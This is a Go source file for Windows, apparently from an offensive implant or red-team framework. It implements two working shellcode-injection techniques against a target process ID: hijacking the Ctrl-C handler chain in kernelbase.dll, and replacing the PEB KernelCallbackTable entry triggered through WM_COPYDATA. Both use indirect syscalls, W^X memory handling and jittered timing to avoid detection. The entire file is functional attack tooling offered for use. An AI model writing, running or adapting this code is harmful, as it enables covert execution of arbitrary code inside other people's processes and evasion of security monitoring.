//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// executeOpusVariant1 implements Ctrl-C Handler Chain Injection
func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Opus Injection Variant 1: Ctrl-C Handler Chain Injection\n")
	sb.WriteString("[*] Target: Console processes only\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))

	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")
	}

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
		PROCESS_QUERY_INFORMATION)
	hProcess, err := injectOpenProcess(desiredAccess, pid)
	if err != nil {
		return sb.String(), err
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))

	// Step 2: Find kernelbase.dll in target process
	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "kernelbase.dll")
	if err != nil {
		return sb.String(), fmt.Errorf("failed to find kernelbase.dll: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Found kernelbase.dll at: 0x%X\n", kernelbaseAddr))

	// Step 3: Calculate addresses using known RVA offsets
	handlerListPtrAddr := kernelbaseAddr + HandlerListRVA
	handlerListLengthAddr := kernelbaseAddr + HandlerListLengthRVA
	allocatedLengthAddr := kernelbaseAddr + AllocatedHandlerListLengthRVA

	// Step 4: Read handler array pointer, count, and capacity
	var handlerArrayAddr uintptr
	err = injectReadMemoryInto(hProcess, handlerListPtrAddr, unsafe.Pointer(&handlerArrayAddr), 8)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to read HandlerList pointer: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Handler array at: 0x%X\n", handlerArrayAddr))

	var handlerCount, allocatedCount uint32
	err = injectReadMemoryInto(hProcess, handlerListLengthAddr, unsafe.Pointer(&handlerCount), 4)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to read HandlerListLength: %w", err)
	}
	err = injectReadMemoryInto(hProcess, allocatedLengthAddr, unsafe.Pointer(&allocatedCount), 4)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to read AllocatedHandlerListLength: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Current handlers: %d, Capacity: %d\n", handlerCount, allocatedCount))

	if handlerCount >= allocatedCount {
		return sb.String(), fmt.Errorf("handler array is full (%d/%d) - cannot inject without reallocation", handlerCount, allocatedCount)
	}

	// Step 5: Get process cookie
	pointerCookie, err := getProcessCookie(windows.Handle(hProcess))
	if err != nil {
		return sb.String(), fmt.Errorf("failed to get process cookie: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Process cookie: 0x%X\n", pointerCookie))

	// Step 6: Allocate + write shellcode (W^X: RW → write → RX)
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return sb.String(), fmt.Errorf("shellcode injection failed: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))

	// Step 7: Encode shellcode address using the target's pointer cookie
	encodedShellcodeAddr := encodePointer(shellcodeAddr, pointerCookie)
	sb.WriteString(fmt.Sprintf("[+] Encoded shellcode address: 0x%X\n", encodedShellcodeAddr))

	// Step 8: Write encoded pointer to handler array
	targetSlot := handlerArrayAddr + uintptr(handlerCount)*8
	encodedBytes := (*[8]byte)(unsafe.Pointer(&encodedShellcodeAddr))[:]
	_, err = injectWriteMemory(hProcess, targetSlot, encodedBytes)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to write handler to array: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote encoded handler to slot %d\n", handlerCount))

	// Step 9: Increment HandlerListLength
	newCount := handlerCount + 1
	newCountBytes := (*[4]byte)(unsafe.Pointer(&newCount))[:]
	_, err = injectWriteMemory(hProcess, handlerListLengthAddr, newCountBytes)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to update HandlerListLength: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Updated HandlerListLength: %d -> %d\n", handlerCount, newCount))

	// Step 10: Attach to target console and trigger
	procFreeConsole.Call()
	ret, _, attachErr := procAttachConsole.Call(uintptr(pid))
	if ret == 0 {
		// Restore handler count
		oldCountBytes := (*[4]byte)(unsafe.Pointer(&handlerCount))[:]
		injectWriteMemory(hProcess, handlerListLengthAddr, oldCountBytes)
		procAllocConsole.Call()
		return sb.String(), fmt.Errorf("AttachConsole failed: %v (target may not be a console process)", attachErr)
	}
	sb.WriteString("[+] Attached to target console\n")

	ret, _, ctrlErr := procGenerateConsoleCtrlEvent.Call(uintptr(CTRL_C_EVENT), 0)
	if ret == 0 {
		sb.WriteString(fmt.Sprintf("[!] GenerateConsoleCtrlEvent failed: %v\n", ctrlErr))
		sb.WriteString("[*] MANUAL TRIGGER: Press Ctrl+C in the target console window.\n")
	} else {
		sb.WriteString("[+] Generated CTRL_C_EVENT to target console\n")
	}

	procFreeConsole.Call()
	procAllocConsole.Call()

	if IndirectSyscallsAvailable() {
		sb.WriteString("[+] Opus Injection Variant 1 completed (indirect syscalls)\n")
	} else {
		sb.WriteString("[+] Opus Injection Variant 1 completed\n")
	}

	return sb.String(), nil
}

// executeOpusVariant4 implements PEB KernelCallbackTable Injection
func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Opus Injection Variant 4: PEB KernelCallbackTable Injection\n")
	sb.WriteString("[*] Target: GUI processes only (requires user32.dll)\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))

	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")
	}

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
		PROCESS_QUERY_INFORMATION)
	hProcess, err := injectOpenProcess(desiredAccess, pid)
	if err != nil {
		return sb.String(), err
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))

	// Step 2: Query PEB address via NtQueryInformationProcess
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := procNtQueryInformationProcessOp.Call(
		hProcess,
		uintptr(ProcessBasicInformation),
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Target PEB address: 0x%X\n", pbi.PebBaseAddress))

	// Step 3: Read KernelCallbackTable pointer from PEB+0x58
	kernelCallbackTablePtrAddr := pbi.PebBaseAddress + PEBKernelCallbackTableOffset
	var kernelCallbackTable uintptr
	err = injectReadMemoryInto(hProcess, kernelCallbackTablePtrAddr, unsafe.Pointer(&kernelCallbackTable), 8)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable pointer: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Original KernelCallbackTable: 0x%X\n", kernelCallbackTable))

	if kernelCallbackTable == 0 {
		return sb.String(), fmt.Errorf("KernelCallbackTable is NULL - target may not be a GUI process")
	}

	// Step 4: Read original callback table (256 entries)
	const tableSize = 256 * 8
	originalTable, err := injectReadMemory(hProcess, kernelCallbackTable, tableSize)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Read original callback table (%d bytes)\n", len(originalTable)))

	fnCopyDataOriginal := *(*uintptr)(unsafe.Pointer(&originalTable[0]))
	sb.WriteString(fmt.Sprintf("[+] __fnCOPYDATA (index 0): 0x%X\n", fnCopyDataOriginal))

	// Step 5: Allocate + write shellcode (W^X: RW → write → RX)
	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return sb.String(), fmt.Errorf("shellcode injection failed: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))

	// Step 6: Create modified callback table
	modifiedTable := make([]byte, tableSize)
	copy(modifiedTable, originalTable)
	*(*uintptr)(unsafe.Pointer(&modifiedTable[0])) = shellcodeAddr
	sb.WriteString(fmt.Sprintf("[+] Modified __fnCOPYDATA: 0x%X -> 0x%X\n", fnCopyDataOriginal, shellcodeAddr))

	// Step 7: Allocate + write modified table (RW is fine, no execution needed)
	remoteTableAddr, err := injectAllocMemory(hProcess, tableSize, PAGE_READWRITE)
	if err != nil {
		return sb.String(), fmt.Errorf("remote allocation for table failed: %w", err)
	}
	_, err = injectWriteMemory(hProcess, remoteTableAddr, modifiedTable)
	if err != nil {
		return sb.String(), fmt.Errorf("remote write for table failed: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Modified callback table at: 0x%X\n", remoteTableAddr))

	// Step 8: Update PEB+0x58 to point to modified table
	ptrBytes := (*[8]byte)(unsafe.Pointer(&remoteTableAddr))[:]
	_, err = injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, ptrBytes)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to update PEB KernelCallbackTable pointer: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Updated PEB+0x58: 0x%X -> 0x%X\n", kernelCallbackTable, remoteTableAddr))

	// Step 9: Find window and trigger via WM_COPYDATA
	hwnd, err := findWindowByPID(pid)
	if err != nil {
		// Restore original table pointer before failing
		origPtrBytes := (*[8]byte)(unsafe.Pointer(&kernelCallbackTable))[:]
		injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, origPtrBytes)
		return sb.String(), fmt.Errorf("failed to find window for PID %d: %w", pid, err)
	}
	sb.WriteString(fmt.Sprintf("[+] Found target window: 0x%X\n", hwnd))

	sb.WriteString("\n[*] Triggering shellcode via WM_COPYDATA...\n")
	data := []byte("test")
	cds := COPYDATASTRUCT{
		DwData: 1,
		CbData: uint32(len(data)),
		LpData: uintptr(unsafe.Pointer(&data[0])),
	}

	go func() {
		procSendMessageA.Call(uintptr(hwnd), uintptr(WM_COPYDATA),
			uintptr(hwnd), uintptr(unsafe.Pointer(&cds)))
	}()
	sb.WriteString("[+] Sent WM_COPYDATA message (async)\n")

	jitterSleep(400*time.Millisecond, 700*time.Millisecond)

	// Step 10: Restore original KernelCallbackTable pointer
	origPtrBytes := (*[8]byte)(unsafe.Pointer(&kernelCallbackTable))[:]
	_, err = injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, origPtrBytes)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] Warning: Failed to restore KernelCallbackTable: %v\n", err))
	} else {
		sb.WriteString("[+] Restored original KernelCallbackTable pointer\n")
	}

	if IndirectSyscallsAvailable() {
		sb.WriteString("[+] Opus Injection Variant 4 completed (indirect syscalls)\n")
	} else {
		sb.WriteString("[+] Opus Injection Variant 4 completed\n")
	}

	return sb.String(), nil
}

// findModuleInProcess finds a module's base address in a remote process
func findModuleInProcess(hProcess windows.Handle, moduleName string) (uintptr, error) {
	// Use EnumProcessModulesEx to find the module
	var modules [1024]windows.Handle
	var needed uint32

	err := windows.EnumProcessModulesEx(hProcess, &modules[0], uint32(len(modules)*int(unsafe.Sizeof(modules[0]))), &needed, windows.LIST_MODULES_ALL)
	if err != nil {
		return 0, err
	}

	numModules := needed / uint32(unsafe.Sizeof(modules[0]))

	for i := uint32(0); i < numModules; i++ {
		var modName [windows.MAX_PATH]uint16
		err := windows.GetModuleBaseName(hProcess, modules[i], &modName[0], windows.MAX_PATH)
		if err != nil {
			continue
		}

		name := windows.UTF16ToString(modName[:])
		if stringsEqualFold(name, moduleName) {
			return uintptr(modules[i]), nil
		}
	}

	return 0, fmt.Errorf("module %s not found", moduleName)
}
